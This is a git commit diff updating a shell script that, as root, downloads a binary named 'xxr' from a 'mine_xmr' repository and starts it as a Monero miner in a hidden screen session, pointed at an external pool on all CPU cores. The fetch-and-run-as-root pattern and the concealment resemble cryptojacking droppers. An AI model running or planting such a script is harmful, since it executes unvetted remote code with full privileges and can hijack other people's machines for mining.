83830311a2121e8e226d8d9a15a7b1fffbd1fcee
yuqingkj <42601051+yuqingkj@users.noreply.github.com>
2024-09-16 20:58:29 +0800

    Update m416.sh

--- m416.sh
+++ m416.sh
@@ -2,7 +2,7 @@
 sudo -i <<EOF
 mkdir xxr
 cd ./xxr
-wget https://github.com/yuqingkj/mine_xmr/releases/download/6.21.2/xxr
+wget https://github.com/yuqingkj/mine_xmr/releases/download/6.22.0/xxr
 chmod 777 ./xxr
 screen -dmS xxr
 screen -x -S xxr -p 0 -X stuff "./xxr -o bt.azshop.one:3333 --rig-id az -t $(nproc) \n"
